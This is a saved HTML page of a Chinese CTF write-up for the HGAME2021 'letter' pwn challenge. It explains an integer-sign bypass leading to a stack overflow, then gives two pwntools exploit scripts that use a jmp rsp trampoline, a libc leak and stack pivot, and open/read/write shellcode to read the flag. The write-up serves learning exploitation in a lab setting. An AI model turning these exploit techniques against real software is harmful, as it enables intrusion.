@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【WP】orw的shellcode编写 | aYoung's Blog</title><meta name="keywords" content="ctf,pwn,wp"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本题来自HGAME2021 week1 题目描述存在负数溢出LOWORD 取第十六位   读十字节数据到栈上，通过atoi函数将读入数据转换为int类型数据并赋给变量length，而length为unsigned int且位于bss段 将unsignde int的变量强制转换为signed int类型并与15比大小，只需要写入负数即可绕过比较同时触发栈溢出 程序存在seccomp，无法调用syst">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【WP】orw的shellcode编写">
+<meta property="og:url" content="https://iamayoung.xyz/2021/02/22/%E3%80%90WP%E3%80%91orw%E7%9A%84shellcode%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="aYoung&#39;s Blog">
+<meta property="og:description" content="本题来自HGAME2021 week1 题目描述存在负数溢出LOWORD 取第十六位   读十字节数据到栈上，通过atoi函数将读入数据转换为int类型数据并赋给变量length，而length为unsigned int且位于bss段 将unsignde int的变量强制转换为signed int类型并与15比大小，只需要写入负数即可绕过比较同时触发栈溢出 程序存在seccomp，无法调用syst">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png">
+<meta property="article:published_time" content="2021-02-22T11:30:01.000Z">
+<meta property="article:modified_time" content="2021-03-07T16:12:05.217Z">
+<meta property="article:author" content="aYoung">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://iamayoung.xyz/2021/02/22/%E3%80%90WP%E3%80%91orw%E7%9A%84shellcode%E7%BC%96%E5%86%99/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-08 00:12:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【WP】orw的shellcode编写</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-22T11:30:01.000Z" title="发表于 2021-02-22 19:30:01">2021-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-07T16:12:05.217Z" title="更新于 2021-03-08 00:12:05">2021-03-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">847</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本题来自HGAME2021 week1</p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>存在负数溢出<br>LOWORD 取第十六位</p>
+<img src = 'https://i.bmp.ovh/imgs/2021/02/68930cf5e3709952.png' />
+
+<p>读十字节数据到栈上，通过atoi函数将读入数据转换为int类型数据并赋给变量length，而length为unsigned int且位于bss段<br><img src = 'https://i.bmp.ovh/imgs/2021/02/362d53900133d56b.png' /></p>
+<p>将unsignde int的变量强制转换为signed int类型并与15比大小，只需要写入负数即可绕过比较同时触发栈溢出</p>
+<p>程序存在seccomp，无法调用system等系统调用函数，open,read,write函数可用，考虑通过这三个函数读取并显示flag文件<br><img src = 'https://i.bmp.ovh/imgs/2021/02/a1915a987b32b8c0.png' /></p>
+<img src = 'https://i.bmp.ovh/imgs/2021/02/84259f7578399678.png' />
+
+<img src = 'https://i.bmp.ovh/imgs/2021/02/9c2f6292b8489b05.png' />
+程序存在rwx段，且NX保护未开启，于是可以通过在栈上写入shellcode并执行
+
+<h1 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h1><p><strong>以jmp rsp指令为跳板</strong><br>思路：输入一个负数，经atoi函数转化后存在buf里，然后取它的低双字部分(对应后面的8个16进制数)，使它是 jmp rsp对应的地址。第二次输入时返回地址布置为jmp rsp，紧接着填充orw的shellcode</p>
+<p>如何寻找jmp rsp地址呢？<br>写一段shellcode然后查看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;jmp rsp&#x27;</span></span><br><span class="line">res = asm(shellcode)</span><br><span class="line">···</span><br><span class="line">r.send(res)</span><br></pre></td></tr></table></figure>
+<img src = 'https://i.bmp.ovh/imgs/2021/03/42b5d03829c8f512.png' />
+
+<p>可以看到<code>&#39;jmp rsp&#39;</code>指令对应的形式为0xe4ff<br>要负数，所以考虑让其存储为0xf000e4ff，计算需要输入的数：由于 0xffffffff-0xf000e4ff+1 = 268376833, 所以我们在第一次读入时写入-268376833<br>看到length处指向的指令为jmp rsp<br><img src = 'https://i.bmp.ovh/imgs/2021/02/cdea48b3d031fd5a.png' /></p>
+<p>直接在栈上返回地址填入length变量的地址，并在之后继续写入shellcode内容<br>则当执行到返回地址处时，会执行jmp rsp指令，而此时rsp正指向shellcode的内容，从而直接执行shellcode</p>
+<p>【push 0x67616c66，该程序为小端序，0x67616c66正确顺序为0x666c6167，对应字符串flag，作为open函数的参数】</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h1><p>栈迁移+shellcode<br>思路：</p>
+<ul>
+<li>写入负数绕过检查</li>
+<li>利用csu通用gadget泄露write真实地址，计算libc基址，并计算open函数真实地址</li>
+<li>注意在后面pop rbp时设置好之后栈迁移处的栈底地址<img src = 'https://i.bmp.ovh/imgs/2021/02/a8d042d51243f8ff.png' /></li>
+<li>返回到栈溢出处继续执行</li>
+<li>由于刚才设置了rbp的值为0x601510，跳转执行read时读入地址是如下图所示计算得到的，所以这次会把我们的输入写到0x601500<!--buf偏移为0x10;0x601510这里在程序运行时属于rwx区域-->
+<img src="https://ae01.alicdn.com/kf/U0cb772fd0f5b4b0a8ce8fdc5ef29a1f2h.jpg"/>
+
+</li>
+</ul>
+<img src="https://ae01.alicdn.com/kf/Ud9b92823f7eb4a6c872dedab8c771fceL.jpg"/>
+
+<img src="https://ae01.alicdn.com/kf/Uc8f8a59712a3439e9be5f2f282a9b14dq.jpg"/>
+
+<ul>
+<li>从0x601500开始读入（0x18+8）= 0x20个字节，所以在返回地址处写入0x601520，并在这之后继续写入shellcode，从而成功返回到shellcode并执行<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop6 = <span class="number">0x400A9A</span></span><br><span class="line">mmmc = <span class="number">0x400A80</span></span><br><span class="line">vuln = <span class="number">0x400958</span></span><br><span class="line">p = process(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xffffffff</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x4009DD</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.\n&#x27;</span>)</span><br><span class="line">write_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase = write_leak - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libcbase==&gt;&#x27;</span>, <span class="built_in">hex</span>(libcbase)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)+asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="本地打效果"><a href="#本地打效果" class="headerlink" title="本地打效果"></a>本地打效果</h1><img src = 'https://i.bmp.ovh/imgs/2021/02/86fac0933a7008df.png' /></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2021/02/22/%E3%80%90WP%E3%80%91orw%E7%9A%84shellcode%E7%BC%96%E5%86%99/">https://iamayoung.xyz/2021/02/22/%E3%80%90WP%E3%80%91orw%E7%9A%84shellcode%E7%BC%96%E5%86%99/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/22/%E3%80%90WP%E3%80%91%E7%AE%80%E5%8D%95%E7%9A%84srop/"><img class="prev-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【WP】简单的srop</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/19/python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"><img class="next-cover" src="https://ftp.bmp.ovh/imgs/2021/01/70c83f7199199d10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">python异常处理</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/12/how2heap学习笔记-3/" title="how2heap学习笔记-3"><img class="cover" src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-12</div><div class="title">how2heap学习笔记-3</div></div></a></div><div><a href="/2021/04/15/how2heap学习笔记-2/" title="how2heap学习笔记-2"><img class="cover" src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-15</div><div class="title">how2heap学习笔记-2</div></div></a></div><div><a href="/2021/01/08/【WP】BUUCTF之not_the_same_3dsctf_2016/" title="【WP】BUUCTF之not_the_same_3dsctf_2016"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/c580c803fd53c030.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-08</div><div class="title">【WP】BUUCTF之not_the_same_3dsctf_2016</div></div></a></div><div><a href="/2021/01/15/【WP】BUUCTF之【BlackWatch入群题】PWN/" title="【WP】BUUCTF之【BlackWatch入群题】PWN"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/c580c803fd53c030.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">【WP】BUUCTF之【BlackWatch入群题】PWN</div></div></a></div><div><a href="/2021/01/12/【WP】adworld之pwn新手区string/" title="【WP】adworld之pwn新手区string"><img class="cover" src="https://i.bmp.ovh/imgs/2021/01/7acaece6c5ada24b.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-12</div><div class="title">【WP】adworld之pwn新手区string</div></div></a></div><div><a href="/2021/01/21/【WP】adworld之pwn进阶区Mary-Morton/" title="【WP】adworld之pwn进阶区Mary_Morton"><img class="cover" src="https://i.bmp.ovh/imgs/2021/01/c9d08fbaeb1fe8f9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-21</div><div class="title">【WP】adworld之pwn进阶区Mary_Morton</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp1"><span class="toc-number">2.</span> <span class="toc-text">exp1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp2"><span class="toc-number">3.</span> <span class="toc-text">exp2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%89%93%E6%95%88%E6%9E%9C"><span class="toc-number">4.</span> <span class="toc-text">本地打效果</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/%E3%80%90WP%E3%80%91%E6%B4%A5%E9%97%A8%E6%9D%AF2021-easypwn/" title="【WP】津门杯2021-easypwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】津门杯2021-easypwn"/></a><div class="content"><a class="title" href="/2021/05/13/%E3%80%90WP%E3%80%91%E6%B4%A5%E9%97%A8%E6%9D%AF2021-easypwn/" title="【WP】津门杯2021-easypwn">【WP】津门杯2021-easypwn</a><time datetime="2021-05-13T13:17:46.000Z" title="发表于 2021-05-13 21:17:46">2021-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/%E3%80%90WP%E3%80%91CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】CSTC2021-Pwn"/></a><div class="content"><a class="title" href="/2021/05/13/%E3%80%90WP%E3%80%91CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn">【WP】CSTC2021-Pwn</a><time datetime="2021-05-13T13:17:16.000Z" title="发表于 2021-05-13 21:17:16">2021-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/12/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/" title="how2heap学习笔记-3"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap学习笔记-3"/></a><div class="content"><a class="title" href="/2021/05/12/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/" title="how2heap学习笔记-3">how2heap学习笔记-3</a><time datetime="2021-05-12T07:35:52.000Z" title="发表于 2021-05-12 15:35:52">2021-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/15/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/" title="how2heap学习笔记-2"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap学习笔记-2"/></a><div class="content"><a class="title" href="/2021/04/15/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/" title="how2heap学习笔记-2">how2heap学习笔记-2</a><time datetime="2021-04-15T09:05:47.000Z" title="发表于 2021-04-15 17:05:47">2021-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/14/%E3%80%90WP%E3%80%91hitcon2014-stkof/" title="【WP】hitcon2014_stkof"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】hitcon2014_stkof"/></a><div class="content"><a class="title" href="/2021/04/14/%E3%80%90WP%E3%80%91hitcon2014-stkof/" title="【WP】hitcon2014_stkof">【WP】hitcon2014_stkof</a><time datetime="2021-04-14T07:43:14.000Z" title="发表于 2021-04-14 15:43:14">2021-04-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" 